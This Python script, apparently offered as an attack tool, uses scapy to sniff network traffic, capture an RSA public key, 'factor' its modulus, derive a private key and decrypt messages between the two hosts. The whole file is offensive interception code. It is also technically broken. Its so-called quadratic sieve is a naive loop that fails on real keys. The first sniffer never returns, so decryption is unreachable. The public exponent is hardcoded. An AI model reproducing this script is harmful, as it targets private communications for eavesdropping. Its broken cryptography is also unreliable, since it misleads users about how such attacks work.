from scapy.all import sniff, IP, TCP
import rsa  # Simplified RSA operations, install with `pip install rsa`

# Global variables to store keys and state
private_key = None
captured_ips = []

# Part 1: Intercept RSA Public Key
def intercept_key(packet):
    global private_key, captured_ips
    try:
        if TCP in packet and b"BEGIN RSA PUBLIC KEY" in bytes(packet[TCP].payload):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            captured_ips = [src_ip, dst_ip]  # Capture the IPs involved in the key exchange
            key_data = bytes(packet[TCP].payload)
            public_key = rsa.PublicKey.load_pkcs1(key_data)
            print(f"Public Key Captured between {src_ip} and {dst_ip}")
            factor_and_prepare(public_key.n)
    except Exception as e:
        print(f"Error processing packet: {e}")

import math

def is_square(n):
    """ Check if n is a perfect square """
    root = int(math.sqrt(n))
    return root * root == n

def trial_division(n, limit):
    """ Simple trial division algorithm up to a given limit """
    assert n >= 2
    for i in range(2, limit):
        if n % i == 0:
            return i
    return n

def qsieve(n):
    """ Simplified version of the Quadratic Sieve algorithm for factoring integers """
    limit = int(math.sqrt(n)) + 1
    for base in range(2, limit):
        val = base * base - n
        if is_square(val):
            x = int(math.sqrt(val))
            factor1 = math.gcd(n, base + x)
            factor2 = math.gcd(n, base - x)
            if factor1 != 1 or factor2 != 1:
                return (factor1, factor2)
    return "No factors found with simple QS"

# Part 2: Factor the Key's Modulus using Quadratic Sieve and prepare for decryption
def factor_and_prepare(n):
    global private_key
    print("Starting factorization...")
    factors = qsieve(n)
    if len(factors) == 2:
        p, q = factors
        print(f"Factors of n: p = {p}, q = {q}")
        try:
            # Calculate private key components
            phi = (p-1) * (q-1)
            e = 65537  # Common public exponent
            d = rsa.core.inverse(e, phi)
            private_key = rsa.PrivateKey(n, e, d, p, q)
            print("Private key successfully derived. Listening for messages to decrypt...")
        except Exception as e:
            print(f"Error constructing private key: {e}")
    else:
        print("Failed to factor n into two primes")

# Part 3: Decrypt incoming messages using the derived private key
def decrypt_messages(packet):
    global private_key, captured_ips
    if TCP in packet and packet[IP].src in captured_ips and packet[IP].dst in captured_ips:
        try:
            if private_key and packet[TCP].payload:
                encrypted_msg = bytes(packet[TCP].payload)
                decrypted_msg = rsa.decrypt(encrypted_msg, private_key)
                print(f"Decrypted message from {packet[IP].src} to {packet[IP].dst}: {decrypted_msg.decode()}")
        except Exception as e:
            print(f"Error decrypting message: {e}")

# Part 4: Setup Network Sniffer to intercept keys and decrypt messages
def setup_sniffer():
    print("Starting network sniffer...")
    sniff(filter="tcp", prn=intercept_key)  # Listen for key exchanges
    sniff(filter=f"tcp and (host {captured_ips[0]} and host {captured_ips[1]})", prn=decrypt_messages)  # Decrypt messages

if __name__ == "__main__":
    setup_sniffer()
